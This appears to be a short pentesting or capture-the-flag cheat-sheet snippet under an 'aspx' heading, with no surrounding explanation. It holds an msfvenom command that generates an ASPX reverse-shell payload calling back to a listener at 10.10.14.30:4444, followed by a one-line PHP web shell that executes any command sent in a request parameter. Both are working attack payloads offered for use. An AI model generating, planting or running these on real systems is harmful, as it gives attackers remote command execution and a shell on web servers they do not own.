### aspx
`msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.14.30 LPORT=4444 -o reverse-shell.aspx`

<?php system($_REQUEST["cmd"]); ?>
